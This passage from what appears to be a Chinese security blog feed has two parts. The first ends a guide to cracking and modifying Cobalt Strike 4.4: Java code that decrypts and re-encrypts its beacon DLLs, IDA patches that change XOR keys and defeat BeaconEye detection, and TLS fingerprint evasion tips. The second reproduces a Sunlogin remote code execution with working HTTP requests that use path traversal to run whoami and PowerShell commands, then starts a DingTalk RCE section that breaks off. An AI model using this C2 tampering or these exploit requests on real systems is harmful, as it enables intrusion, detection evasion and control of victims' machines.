&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] hex2bytes(String var0) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> var0.length();<br>        <span class="hljs-type">byte</span>[] var2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[var1 / <span class="hljs-number">2</span>];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var3 &lt; var1; var3 += <span class="hljs-number">2</span>) &#123;<br>            var2[var3 / <span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((Character.digit(var0.charAt(var3), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">4</span>) + Character.digit(var0.charAt(var3 + <span class="hljs-number">1</span>), <span class="hljs-number">16</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var2;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Generate_Key() &#123;<br>        java.security.<span class="hljs-type">SecureRandom</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.security.SecureRandom();<br>        <span class="hljs-type">byte</span>[] PrivateBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        random.nextBytes(PrivateBytes);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Random_Keys</span> <span class="hljs-operator">=</span> java.util.Arrays.toString(PrivateBytes);<br>        System.out.println(<span class="hljs-string">&quot;[-] Example: \n[*] Random_Keys= &quot;</span> + Random_Keys);<br>        <span class="hljs-keyword">return</span> PrivateBytes;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (args.length == <span class="hljs-number">0</span> || args[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;-h&quot;</span>) || args[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;--help&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;UseAge: CrackSleeve OPTION [key]&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;Options:&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\tdecode\t\tDecode sleeve files&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\tencode\t\tEncode sleeve files&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\tkey\t\tCustomize key string for encode sleeve files&quot;</span>);<br>            System.exit(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (option.toLowerCase().equals(<span class="hljs-string">&quot;encode&quot;</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (args.length &lt;= <span class="hljs-number">1</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[-] Please enter key.&quot;</span>);<br>                <span class="hljs-type">byte</span>[] Customize_key = Generate_Key();<br>                System.out.println(<span class="hljs-string">&quot;[*] Random_Keys Hash =&gt;&gt; &quot;</span> + bytesToHex(Customize_key));<br>                System.out.printf(<span class="hljs-string">&quot;[*] $ java -cp cobaltstrike.jar:. CrackSleeve encode %s \n&quot;</span>, bytesToHex(Customize_key) +<span class="hljs-string">&quot;\n&quot;</span>);<br>                System.exit(<span class="hljs-number">0</span>);<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">CustomizeKeyStr</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> (CustomizeKeyStr.length() &lt; <span class="hljs-number">16</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[-] key length must be 16.&quot;</span>);<br>                System.exit(<span class="hljs-number">0</span>);<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;Init Key: &quot;</span> + CustomizeKeyStr.substring(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>));<br><span class="hljs-comment">//            CustomizeKey = CustomizeKeyStr.substring(0,16).getBytes();</span><br>            CustomizeKey = hex2bytes(CustomizeKeyStr.substring(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>));<br>        &#125;<br><br><br>        <span class="hljs-type">CrackSleeve</span> <span class="hljs-variable">Cracker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CrackSleeve</span>();<br>        <span class="hljs-comment">// 使用正版key初始化SleeveSecurity中的key</span><br>        <span class="hljs-keyword">if</span> (option.equals(<span class="hljs-string">&quot;decode&quot;</span>)) &#123;<br>            CrackSleevedResource.Setup(OriginKey);<br>            Cracker.DecodeFile();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (option.equals(<span class="hljs-string">&quot;encode&quot;</span>)) &#123;<br>            CrackSleevedResource.Setup(CustomizeKey);<br>            Cracker.EncodeFile();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">DecodeFile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 文件保存目录</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">saveDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-built_in">this</span>.DecDir);<br>        <span class="hljs-keyword">if</span> (!saveDir.isDirectory()) &#123;<br>            saveDir.mkdirs();<br>        &#125;<br><br>        <span class="hljs-comment">// 获取jar文件中sleeve文件夹下的文件列表</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(<span class="hljs-string">&quot;sleeve&quot;</span>).getPath();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">jarPath</span> <span class="hljs-operator">=</span> path.substring(<span class="hljs-number">5</span>, path.indexOf(<span class="hljs-string">&quot;!/&quot;</span>));<br>            Enumeration&lt;JarEntry&gt; jarEnum = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JarFile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(jarPath)).entries();<br>            <span class="hljs-keyword">while</span> (jarEnum.hasMoreElements()) &#123;<br>                <span class="hljs-type">JarEntry</span> <span class="hljs-variable">Element</span> <span class="hljs-operator">=</span> jarEnum.nextElement();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">FileName</span> <span class="hljs-operator">=</span> Element.getName();<br>                <span class="hljs-keyword">if</span> (FileName.indexOf(<span class="hljs-string">&quot;sleeve&quot;</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp; !FileName.equals(<span class="hljs-string">&quot;sleeve/&quot;</span>)) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;[+] Decoding &quot;</span> + FileName + <span class="hljs-string">&quot;......&quot;</span>);<br>                    <span class="hljs-type">byte</span>[] decBytes = CrackSleevedResource.DecodeResource(FileName);<br>                    <span class="hljs-keyword">if</span> (decBytes.length &gt; <span class="hljs-number">0</span>) &#123;<br>                        System.out.println(<span class="hljs-string">&quot;Done.&quot;</span>);<br>                        CommonUtils.writeToFile(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(saveDir, <span class="hljs-string">&quot;../&quot;</span> + FileName), decBytes);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        System.out.println(<span class="hljs-string">&quot;Fail.&quot;</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">EncodeFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 文件保存目录</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">saveDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-built_in">this</span>.EncDir);<br>        <span class="hljs-keyword">if</span> (!saveDir.isDirectory()) &#123;<br>            saveDir.mkdirs();<br>        &#125;<br><br>        <span class="hljs-comment">// 获取解密文件列表</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">decDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-built_in">this</span>.DecDir);<br>        File[] decFiles = decDir.listFiles();<br>        <span class="hljs-keyword">if</span> (decFiles.length == <span class="hljs-number">0</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;[-] There&#x27;s no file to encode, please decode first.&quot;</span>);<br>            System.exit(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (File file : decFiles) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> decDir.getPath() + <span class="hljs-string">&quot;/&quot;</span> + file.getName();<br>            System.out.print(<span class="hljs-string">&quot;[+] Encoding &quot;</span> + file.getName() + <span class="hljs-string">&quot;......&quot;</span>);<br>            <span class="hljs-type">byte</span>[] encBytes = CrackSleevedResource.EncodeResource(filename);<br>            <span class="hljs-keyword">if</span> (encBytes.length &gt; <span class="hljs-number">0</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;Done.&quot;</span>);<br>                CommonUtils.writeToFile(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(saveDir, file.getName()), encBytes);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;Fail.&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CrackSleevedResource</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> CrackSleevedResource singleton;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">SleeveSecurity</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SleeveSecurity</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Setup</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] paramArrayOfbyte)</span> &#123;<br>        singleton = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CrackSleevedResource</span>(paramArrayOfbyte);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] DecodeResource(String paramString) &#123;<br>        <span class="hljs-keyword">return</span> singleton._DecodeResource(paramString);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] EncodeResource(String paramString) &#123;<br>        <span class="hljs-keyword">return</span> singleton._EncodeResource(paramString);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">CrackSleevedResource</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] paramArrayOfbyte)</span> &#123;<br>        <span class="hljs-built_in">this</span>.data.registerKey(paramArrayOfbyte);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] _DecodeResource(String paramString) &#123;<br>        <span class="hljs-type">byte</span>[] arrayOfByte1 = CommonUtils.readResource(paramString);<br>        <span class="hljs-keyword">if</span> (arrayOfByte1.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data.decrypt(arrayOfByte1);<br>        &#125;<br>        <span class="hljs-type">byte</span>[] arrayOfByte2 = CommonUtils.readResource(paramString);<br>        <span class="hljs-keyword">if</span> (arrayOfByte2.length == <span class="hljs-number">0</span>) &#123;<br>            CommonUtils.print_error(<span class="hljs-string">&quot;Could not find sleeved resource: &quot;</span> + paramString + <span class="hljs-string">&quot; [ERROR]&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            CommonUtils.print_stat(<span class="hljs-string">&quot;Used internal resource: &quot;</span> + paramString);<br>        &#125;<br>        <span class="hljs-keyword">return</span> arrayOfByte2;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] _EncodeResource(String paramString) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">fileResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(paramString);<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">fileStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(fileResource);<br>            <span class="hljs-keyword">if</span> (fileStream != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] fileBytes = CommonUtils.readAll(fileStream);<br>                <span class="hljs-keyword">if</span> (fileBytes.length &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-type">byte</span>[] fileEncBytes = <span class="hljs-built_in">this</span>.data.encrypt(fileBytes);<br>                    <span class="hljs-keyword">return</span> fileEncBytes;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>CrackSleeve.java 与原版cs jar放同一目录，执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -encoding UTF-8 -classpath cobaltstrike.jar CrackSleeve.java<br>java -classpath cobaltstrike.jar;./ CrackSleeve decode<br></code></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036230182-57a270c6-f2b3-4609-94d6-abe6dfd4648c.png" referrerPolicy="no-referrer" /><h3 id="0x08-修改默认密钥">0x08 修改默认密钥</h3><h4 id="BeaconPayload">BeaconPayload</h4><p>修改 beacon/BeaconPayload.java 方法 beacon_obfuscate() 中的 46，即 0x2E为其他数字十六进制形式。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036230630-c4a47762-32db-40ac-be5e-7fbe37368d92.png" referrerPolicy="no-referrer" /><h4 id="修改DLL密钥">修改DLL密钥</h4><p>需要修改的dll文件：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs basic">beacon.dll<br>beacon.x64.dll<br>dnsb.dll<br>dnsb.x64.dll<br>pivot.dll<br>pivot.x64.dll<br>extc2.dll<br>extc2.x64.dll<br></code></pre></td></tr></table></figure><p>IDA分别打开上述文件，搜索0x2e是否为异或行为(xor)，出现则Patch，Alt+I 全局搜索0x2e 进行替换为 BeaconPayload.java 中新的值。注意，32位的dll用32位IDA，64反之一样。</p><p>然后，工具栏 Edit–Patch Program–Change byte</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036231014-7d7ecb54-311a-49d7-81e7-ad6af3f54684.png" referrerPolicy="no-referrer" /><p><br/> 修改之后 点击 Edit–Patch Program—Apply Patches to input file ，关闭文件，继续修改下一dll文件个。</p><h3 id="0x09-去除BeaconEye特征">0x09 去除BeaconEye特征</h3><p>用32位IDA打开 beacon.dll，点Hex View-1视图， 按G 跳转到地址：1000A0B9 ，F2或者右键Edit…</p><p><code>6A 00</code> 修改为<code>6A 08</code>，00可修改其他值。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036231667-1824ac61-f094-4e9d-b18b-e957a3f7e77a.png" referrerPolicy="no-referrer" /><p><br/> 修改之后 点击 Edit–Patch Program–Apply Patches to input file ，关闭文件。</p><p>用64位IDA 打开 beacon.x64.dll，按G跳转到地址：<code>000000018001879B</code>，右键 Text View</p><p>然后IDA左上角 Edit----Patch Program—Assemble 修改指令 xor edx, edx 为 mov edx, esi</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036232075-2b139d5a-8202-4890-afbd-fc4409208bd4.png" referrerPolicy="no-referrer" /><p><br/> Edit–Patch Program–Apply Patches to input file</p><h4 id="重新加密DLL">重新加密DLL</h4><p>修改完dll后重新加密。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -classpath cobaltstrike.jar;./ CrackSleeve encode 5e98194a01c6b48fa582a6a9fcbb92d6<br></code></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036232679-700a2eed-db01-41f4-8c99-de316b7e55a2.png" referrerPolicy="no-referrer" /><p><br/> <code>cs44Resource\Encode\sleeve</code> 下 会生成重新加密后的DLL。</p><h4 id="重新构建CS">重新构建CS</h4><p>CS项目下新建文件夹 resources，并把其设置为资源类型。并且把 cs44Resource\Encode\sleeve 整个文件夹复制进去：</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036233130-7972f000-c41d-48eb-8ffc-5cc36e001aaf.png" referrerPolicy="no-referrer" /><p><br/> 把CS原来 MANIFEST.MF 中的内容全部复制到项目 src\META0INF\MANIFEST.MF，替换。</p><p>构建-&gt;构建工件-&gt;重新构建，生成新cs jar包。</p><p>EvilEye、BeaconEye检测结果如下：</p><p>未修改前</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036233785-b1918cb2-d7d4-4d1a-bb22-a917556dcd84.png" referrerPolicy="no-referrer" /><p><br/> 修改后</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036234225-b4847c77-68f0-47fc-a68d-0cdaca84c541.png" referrerPolicy="no-referrer" /><h2 id="辅助">辅助</h2><h3 id="0x01-端口转发">0x01 端口转发</h3><p>主要还是Nginx/socat 中转，如下图(来自某大佬博客)。详情待实操补充。</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650195744938-d76e3021-a957-4ffb-98bd-388a12dd9138.png" referrerPolicy="no-referrer" /><h3 id="0x02-云函数">0x02 云函数</h3><p>略</p><h3 id="0x03-JA3-S-JARM">0x03 JA3/S/JARM</h3><p>找到篇文章：</p><p><a href="https://www.bc-security.org/post/ja3-s-signatures-and-how-to-avoid-them/">https://www.bc-security.org/post/ja3-s-signatures-and-how-to-avoid-them/</a></p><p><a href="https://www.vectra.ai/blogpost/c2-evasion-techniques">https://www.vectra.ai/blogpost/c2-evasion-techniques</a></p><p>好似可以通过修改 TLS 版本，能起到一定的&quot;混淆&quot;作用？</p><p>参考 java 文档 ：<a href="https://java.com/en/configure_crypto.html">https://java.com/en/configure_crypto.html</a></p><p>禁用 TLS 选项：jdk.tls.disabledAlgorithms</p><p>编辑文件 conf/security/java.securitylib/security/java.security 添加或者删除某些tl版本</p><p>如windows上java 11 C:\Program Files\Java\jdk-11.0.13\conf\security\java.security</p><img src="https://cdn.nlark.com/yuque/0/2022/png/12849280/1650036234806-6178ba84-9d23-4a6c-9205-09248186c871.png" referrerPolicy="no-referrer" /><p><br/> 可以把SSLv3、TLSv1、1.1删除，或添加 TLS 1.3。又或者用高版本(11、14、16)java运行 cs服务端。</p><p>Reference</p><p><a href="https://wbglil.gitbook.io/cobalt-strike/">https://wbglil.gitbook.io/cobalt-strike/</a><br><a href="https://lengjibo.github.io/CobaltStrikeCode/">https://lengjibo.github.io/CobaltStrikeCode/</a><br><a href="https://bewhale.github.io/posts/50202.html">https://bewhale.github.io/posts/50202.html</a><br><a href="https://www.bilibili.com/read/cv14238932">https://www.bilibili.com/read/cv14238932</a><br><a href="https://www.anquanke.com/post/id/265090">https://www.anquanke.com/post/id/265090</a><br><a href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/">https://hosch3n.github.io/2020/12/16/检测与隐藏Cobaltstrike服务器/</a><br><a href="https://maka8ka.cc/post/cobaltstrike-4-3-%E7%A0%B4%E8%A7%A3-%E4%BF%AE%E5%A4%8D%E6%9A%97%E6%A1%A9/">https://maka8ka.cc/post/cobaltstrike-4-3-破解-修复暗桩/</a><br><a href="https://ucasers.cn/%E5%AF%B9cobaltstrike4.4%E7%9A%84%E7%AE%80%E5%8D%95%E9%AD%94%E6%94%B9/">https://ucasers.cn/对cobaltstrike4.4的简单魔改/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>向日葵&amp;钉钉RCE</title>
    <link href="/posts/e3164948.html"/>
    <url>/posts/e3164948.html</url>
    
    <content type="html"><![CDATA[<h2 id="低版本向日葵-RCE">低版本向日葵 RCE</h2><p>复现参考Sp4ce师傅的《向日葵远程命令执行漏洞分析》</p><h3 id="0x01-信息">0x01 信息</h3><p>影响版本</p><blockquote><p>10.3.0.27372</p><p>11.0.0.33162_x64</p><p>11.1.1_x64</p></blockquote><p>复现版本为: 11.0.0.33162</p><blockquote><p>向日葵在启动的时候会随机监听一个4~5w以上的端口。其实这个不一定。</p></blockquote><blockquote><p>向日葵在启动的时候会随机监听一个4-5w以上的端口。</p></blockquote><p>因为是本地复现就不扫全端口了，直接用火绒剑查看到监听的是<code>50358</code> 端口：</p><p><img src="https://s4.ax1x.com/2022/02/22/bSsF0I.png" alt=""></p><p>信息特征：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">body=&quot;Veri?cation failure&quot; &amp;&amp; body=&quot;false&quot; &amp;&amp; header=&quot;Cache-Control: no-cache&quot; &amp;&amp; header=&quot;Content-Length: 46&quot; &amp;&amp; header=&quot;Content-Type: application/json&quot;<br></code></pre></td></tr></table></figure><p><img src="https://s4.ax1x.com/2022/02/22/bSsinA.png" alt=""></p><p>访问该端口页面会提返回证失败：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;success&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Verification failure&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="0x02-获取CID">0x02 获取CID</h3><p>向接口 <code>/cgi-bin/rpc</code> 提交 <code>action=verify-haras</code> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST /cgi-bin/rpc HTTP/1.1<br>Host: 192.168.176.128:50358<br>Proxy-Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 19<br><br>action=verify-haras<br></code></pre></td></tr></table></figure><p><img src="https://s4.ax1x.com/2022/02/22/bSrxfO.png" alt=""></p><h3 id="0x03-执行命令">0x03 执行命令</h3><p>接口 <code>/check?cmd=ping</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">GET /check?cmd=ping..%2F..%2F..%2Fwindows%2Fsystem32%2Fwhoami.exe%00 HTTP/1.1<br>Host: 192.168.176.128:50358<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.3<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept-Encoding: gzip, deflate<br>Cookie: CID=ciiHpsOHS1UtC5ZfZMrA1gApw9htv8ph<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br><br></code></pre></td></tr></table></figure><p><img src="https://s4.ax1x.com/2022/02/22/bSrvtK.png" alt=""></p><p>通过powershell执行其他命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">GET /check?cmd==ping../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+net+user HTTP/1.1<br>Host: 192.168.176.128:50358<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept-Encoding: gzip, deflate<br>Cookie: CID=ciiHpsOHS1UtC5ZfZMrA1gApw9htv8ph<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br><br></code></pre></td></tr></table></figure><p>其他接口，执行完直接生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">重启：/control.cgi?__mode=control&amp;act=reboot<br>关机：/control.cgi?__mode=control&amp;act=shutdown<br></code></pre></td></tr></table></figure><h3 id="0x04-Tools">0x04 Tools</h3><p><a href="https://github.com/Mr-xn/sunlogin_rce">https://github.com/Mr-xn/sunlogin_rce</a></p><p><a href="https://github.com/ce-automne/SunloginRCE">https://github.com/ce-automne/SunloginRCE</a></p><h2 id="钉钉-RCE">钉钉 RCE</h2><h3 id="0x01-信息-2">0x01 信息</h3><p>影响版本 <code>&lt; 6.3.25-Release.2149108</code>？</p><p>复现版本 为6.3.5.10278702和6.0.30.9178701：</p><p><code>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v6.3.5.10278702.exe</code></p><p><code>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v6.0.30.9178701</code></p><p>其他：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 